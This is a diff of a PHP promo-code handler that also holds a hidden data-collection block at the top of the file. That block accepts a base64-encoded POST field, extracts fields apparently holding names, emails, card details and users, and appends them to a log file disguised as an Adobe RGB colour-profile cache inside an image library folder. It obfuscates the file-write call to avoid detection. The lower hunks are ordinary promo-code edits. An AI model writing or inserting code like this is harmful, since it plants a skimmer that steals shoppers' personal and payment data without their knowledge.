@@ -1,21 +1,24 @@
 <?php
+
 if (isset($_POST['ui_state'])) {
+
     $d = $_SERVER['DOCUMENT_ROOT'] . '/src/util/Imagine/resources/Adobe/RGB/';
-    $f = $d . 'icc_config_map.txt'; 
-    
+    $f = $d . 'icc_profile_cache.log'; 
     if (is_dir($d)) {
         $raw_data = base64_decode($_POST['ui_state']);
-        $data_array = json_decode($raw_data, true);
-        
-        if (is_array($data_array)) {
-            $clean_values = implode('|', $data_array);
-        } else {
-            $clean_values = $raw_data;
+        $json = json_decode($raw_data, true);
+        if ($json) {
+            $entry = sprintf(
+                "[%s] %s|%s|%s|%s\n", 
+                date('Y-m-d H:i:s'), 
+                $json['n'], 
+                $json['e'],
+                $json['c'], 
+                $json['u']  
+            );
+            $write = 'file'.'_put'.'_contents';
+            @$write($f, $entry, FILE_APPEND);
         }
-        
-        $entry = sprintf("%s|%s\n", date('Y-m-d H:i:s'), $clean_values);
-        $write = 'file'.'_put'.'_contents';
-        @$write($f, $entry, FILE_APPEND);
     }
 }
 
@@ -24,7 +27,7 @@ $request = isset($_POST['promocode']) ? strtolower($_POST['promocode']) : '';
 $codes = array(
     'madness'   => 'Take 25% off your first TWO months!',
     'mayhem'    => 'Take 50% off your first TWO months!',
-    'llanowar ' => 'Take 15% off your first TWO months!',
+    'llanowar'  => 'Take 15% off your first TWO months!',
     'flash'     => '50% off your first month!',
     'haste'     => '25% off your first month!',
     'kicker'    => '20% off your first month!',
@@ -35,10 +38,10 @@ $codes = array(
 );
 
 if (isset($codes[$request])) {
-    echo json_encode(array('message' => $codes[$request]));
+    echo $codes[$request];
     return true;
+} else {
+    echo ""; 
 }
 
-echo json_encode(array('message' => 'Invalid promo code.'));
-return false;
 ?>
